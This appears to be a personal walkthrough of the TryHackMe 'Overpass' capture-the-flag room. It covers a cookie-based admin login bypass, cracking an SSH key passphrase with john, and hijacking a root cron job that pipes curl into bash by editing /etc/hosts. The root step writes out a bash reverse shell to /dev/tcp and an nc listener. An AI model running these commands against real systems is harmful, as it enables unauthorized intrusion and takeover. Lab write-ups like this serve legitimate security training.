# Overpass

[Overpass](https://tryhackme.com/room/overpass)

## Solution

### User

- nmap scan: 22, 80

- trying out gobuster: `gobuster -u http://10.10.3.77 -w /usr/share/dirb/wordlists/common.txt`
    * admin

- there is some source code in the downloads (maybe the code is useful on the
  machine, they might use their own software)

- I looked trough the files that get sent when you access admin

- they use https://github.com/js-cookie/js-cookie for cookies; the login method
  seems weird; so I tried to set the cookie value to some random string, and
  after refreshing the page it redirected me to the admin page.

- we get the SSH key (encrypted) for James

- use john to crack it (ssh2john and then bruteforce)

`ssh2john.py id_rsa > id_rsa.john`

`john --format=ssh id_rsa.john --wordlist /usr/share/wordlists/rockyou.txt`

- then ssh as james

`ssh -i id_rsa james@<ip>` and enter the passphrase

### Root

- we can try to use overpass on the machine and list all passwords

- sadly james does not have sudo privilages

- automated build scripts => cron

- `ps aux | grep cron` => root runs cron... I know there is a way to make cron run my script but how

- `cat /etc/crontab` and we see an interesting line:

`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`

- what if we can somehow make overpass.thm point to my ip address? that might
  require root, to change the hostnames

- that worked. I changed overpass.thm in /etc/hosts to my ip address, then I
  started an http server on port 80, created a ./downloads/src/buildscript.sh
  with a revshell. the cronjob downloaded the file and executed it like a dummy
  dum. (also had a nc listener on port 6969)

On Host

Term 1 `nc -lnvp 6969`
Term 2 `mkdir -p downloads/src/`
Term 2 `echo "sh -i >& /dev/tcp/<host>/6969 0>&1" ./downloads/src/buildscript.sh`
Term 2 `sudo python -m http.server 80` (sudo for port 80)

On Target

`nano /etc/hosts/` (change ip for overpass.thm to <host> ip)

### Code

- once logged in as root, you can access tryhack me user home

`cp /home/tryhackme/.overpass /root/.overpass`

and execute overpass and display all. it will show the code (already used but bonus)

TryHackMe Subscription Code      gmTDyl
